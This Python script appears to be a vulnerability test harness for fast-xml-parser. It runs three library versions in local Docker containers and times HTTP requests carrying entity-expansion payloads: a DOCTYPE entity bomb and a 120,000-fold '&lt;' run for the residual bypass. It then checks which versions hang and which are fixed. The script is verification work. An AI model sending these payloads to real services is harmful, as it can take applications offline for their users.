#!/usr/bin/env python3
"""dos-threshold oracle for fast-xml-parser entity-expansion limits over a REAL HTTP service
(CVE-2026-26278 -> CVE-2026-33036; sink = src/xmlparser/OrderedObjParser.js replaceEntitiesValue()).

No flag token: the signal is SERVER-SIDE latency of an EXTERNAL HTTP request. For each version
{v0=5.3.5, v1=5.3.6, v2=5.5.6} we bring up a REAL Express service that parses a user-supplied XML
body with the REAL published fast-xml-parser (POST /parse -> new XMLParser({processEntities:true})
.parse(req.body), running SYNCHRONOUSLY on the event loop). The oracle POSTs three payloads
{original, residual, benign} from OUTSIDE the container and measures the HTTP round-trip latency
(dominated by the server-side parse); an entity-expansion input hangs the response until the HTTP
timeout, while a FIXED version throws "Entity expansion limit exceeded" and returns in milliseconds.

Because a synchronous entity-expansion parse permanently wedges Node's single-threaded event loop
(the replacement loop cannot be interrupted mid-run), a slow probe would poison any probe sent to
the SAME server afterwards. We therefore restart a FRESH server (kill + up -d -> brand-new node
process, clean event loop) before EVERY probe.

GATE booleans (T_FAST=300ms, T_SLOW=2000ms, HTTP read timeout=10s):
  original_slow_on_v0    : v0.original latency > T_SLOW   (CVE-2026-26278 DOCTYPE bomb unbounded on V0)
  original_bounded_on_v1 : v1.original latency < T_FAST   (5.3.6 counts the DOCTYPE loop -> throws fast)
  residual_slow_on_v1    : v1.residual latency > T_SLOW   (5.3.6 fix INCOMPLETE: lastEntities loop UNCOUNTED)
  residual_bounded_on_v2 : v2.residual latency < T_FAST   (5.5.6 counts the lastEntities loop -> throws fast)
  benign_fast_on_all     : every version's benign latency < T_FAST
  residual_v1_over_v2_gt_50x : clean latency separation on V1 vs V2 for the residual
  passed = all of the above

Usage: python3 oracle.py            # compose build (v0,v1,v2) + gate (fresh server per probe) + teardown
"""
from __future__ import annotations
import http.client
import json
import os
import socket
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
COMPOSE = ["docker", "compose", "-f", os.path.join(HERE, "docker-compose.yml")]
ENV = {**os.environ, "PCB_FLAG": "dos-threshold-no-canary"}

T_FAST = 300.0          # ms  (external HTTP round-trip for a bounded parse / early throw + JSON)
T_SLOW = 2000.0         # ms
HTTP_TIMEOUT_S = 10.0
HTTP_TIMEOUT_MS = HTTP_TIMEOUT_S * 1000.0

PORTS = {"v0": 34920, "v1": 34921, "v2": 34922}
PKG = {"v0": "5.3.5", "v1": "5.3.6", "v2": "5.5.6"}

# ---- payloads (see docker-compose.yml header) ----
_ENTITY = "A" * 5000
PAYLOADS = {
    # original CVE-2026-26278 vector: ONE small DOCTYPE entity referenced 2000x (>1000 => trips the
    # V1 maxTotalExpansions in the COUNTED DOCTYPE loop). Unbounded expansion on V0.
    "original": ('<?xml version="1.0"?>\n<!DOCTYPE r [\n<!ENTITY a "%s">\n]>\n<r>%s</r>'
                 % (_ENTITY, "&a;" * 2000)),
    # residual CVE-2026-33036 vector: a long run of the STANDARD entity &lt; handled by the UNCOUNTED
    # lastEntities loop on V1 -> O(N^2) hang; the COUNTED loop on V2 throws after 1000.
    "residual": "<r>%s</r>" % ("&lt;" * 120000),
    # benign control: a small well-formed XML with a few normal entities.
    "benign": ('<?xml version="1.0"?>\n<note><to>hi</to>'
               '<body>hello &amp; world &lt;ok&gt; &quot;q&quot;</body></note>'),
}


def run(cmd, **kw):
    print("+", " ".join(cmd), flush=True)
    return subprocess.run(cmd, env=ENV, **kw)


def wait_health(port: int, timeout_s: float = 90.0) -> bool:
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        try:
            c = http.client.HTTPConnection("127.0.0.1", port, timeout=3)
            c.request("GET", "/health")
            r = c.getresponse()
            body = r.read()
            c.close()
            if r.status == 200 and b'"ok"' in body:
                return True
        except (ConnectionRefusedError, socket.timeout, OSError):
            pass
        time.sleep(1.0)
    return False


def probe(port: int, payload: str) -> dict:
    """POST /parse with a raw XML body (Content-Type text/xml); measure external HTTP round-trip
    latency (ms). On an entity-expansion hang the server never responds -> socket read timeout ->
    recorded as HTTP_TIMEOUT_MS. On a FIXED version the server throws and returns fast; we surface
    the thrown message (enforcement signal)."""
    data = payload.encode("utf-8")
    t0 = time.perf_counter()
    try:
        c = http.client.HTTPConnection("127.0.0.1", port, timeout=HTTP_TIMEOUT_S)
        c.request("POST", "/parse", body=data,
                  headers={"Content-Type": "text/xml", "Content-Length": str(len(data))})
        r = c.getresponse()
        resp = r.read().decode("utf-8", "replace")
        c.close()
        ms = (time.perf_counter() - t0) * 1000.0
        threw = None
        try:
            j = json.loads(resp)
            threw = j.get("error")
        except Exception:
            pass
        return {"ms": round(ms, 1), "timeout": False, "in_len": len(payload),
                "threw": threw, "resp": resp[:200]}
    except (socket.timeout, TimeoutError):
        ms = (time.perf_counter() - t0) * 1000.0
        return {"ms": round(max(ms, HTTP_TIMEOUT_MS), 1), "timeout": True,
                "in_len": len(payload), "threw": None, "resp": None}
    except OSError as e:
        return {"ms": -1.0, "timeout": False, "error": str(e),
                "in_len": len(payload), "threw": None, "resp": None}


def measure_profile(prof: str) -> dict:
    """Measure each payload against a FRESH server (kill + up -d before every probe: a synchronous
    entity-expansion parse permanently wedges the event loop, so we never reuse a poisoned server)."""
    port = PORTS[prof]
    results = {}
    try:
        for kind in ("original", "residual", "benign"):
            run(COMPOSE + ["--profile", prof, "stop", prof], check=False,
                capture_output=True, text=True)
            run(COMPOSE + ["--profile", prof, "rm", "-f", prof], check=False,
                capture_output=True, text=True)
            run(COMPOSE + ["--profile", prof, "up", "-d"], check=True,
                capture_output=True, text=True)
            if not wait_health(port):
                raise RuntimeError(f"{prof}: /health never came up on :{port}")
            r = probe(port, PAYLOADS[kind])
            results[kind] = r
            print(f"[{prof} fxp={PKG[prof]}] {kind:9s} in_len={r['in_len']:>7} -> "
                  f"{r['ms']:>8}ms timeout={r.get('timeout')} threw={r.get('threw')!r}", flush=True)
        return {"version": prof, "pkg": PKG[prof], "port": port, "results": results}
    finally:
        run(COMPOSE + ["--profile", prof, "kill", prof], check=False,
            capture_output=True, text=True)
        run(COMPOSE + ["--profile", prof, "down"], check=False,
            capture_output=True, text=True)


def main():
    t_start = time.time()
    # Build all three images up-front (recipe: real npm i fast-xml-parser@<ver> + express).
    run(COMPOSE + ["--profile", "v0", "--profile", "v1", "--profile", "v2", "build"], check=True)

    versions = {}
    for prof in ("v0", "v1", "v2"):
        versions[prof] = measure_profile(prof)

    def ms(v, kind):
        return versions[v]["results"][kind]["ms"]

    matrix = {v: {k: versions[v]["results"][k]["ms"] for k in ("original", "residual", "benign")}
              for v in versions}
    threw_matrix = {v: {k: versions[v]["results"][k]["threw"] for k in ("original", "residual", "benign")}
                    for v in versions}

    booleans = {
        "original_slow_on_v0": ms("v0", "original") > T_SLOW,
        "original_bounded_on_v1": ms("v1", "original") < T_FAST,
        "residual_slow_on_v1": ms("v1", "residual") > T_SLOW,
        "residual_bounded_on_v2": ms("v2", "residual") < T_FAST,
        "benign_fast_on_all": all(ms(v, "benign") < T_FAST for v in versions),
    }
    resid_v1, resid_v2 = ms("v1", "residual"), max(ms("v2", "residual"), 0.001)
    booleans["residual_v1_over_v2_gt_50x"] = (resid_v1 / resid_v2) > 50.0
    booleans["passed"] = all(booleans.values())

    report = {
        "case": "fastxmlparser_entity_expansion_limit",
        "oracle_variant": "dos-threshold",
        "run_mode": "real-app-http",
        "external_http_trigger": True,
        "thresholds": {"T_FAST_ms": T_FAST, "T_SLOW_ms": T_SLOW, "http_timeout_ms": HTTP_TIMEOUT_MS},
        "versions": {v: PKG[v] for v in versions},
        "payloads": {k: {"len": len(v)} for k, v in PAYLOADS.items()},
        "latency_matrix_ms": matrix,
        "threw_matrix": threw_matrix,
        "residual_v1_over_v2_ratio": round(resid_v1 / resid_v2, 1),
        "booleans": booleans,
        "elapsed_s": round(time.time() - t_start, 1),
    }
    print("\n=== GATE REPORT ===")
    print(json.dumps(report, indent=2))
    with open(os.path.join(HERE, "gate_result.json"), "w") as f:
        json.dump(report, f, indent=2)
    return 0 if booleans["passed"] else 1


if __name__ == "__main__":
    sys.exit(main())
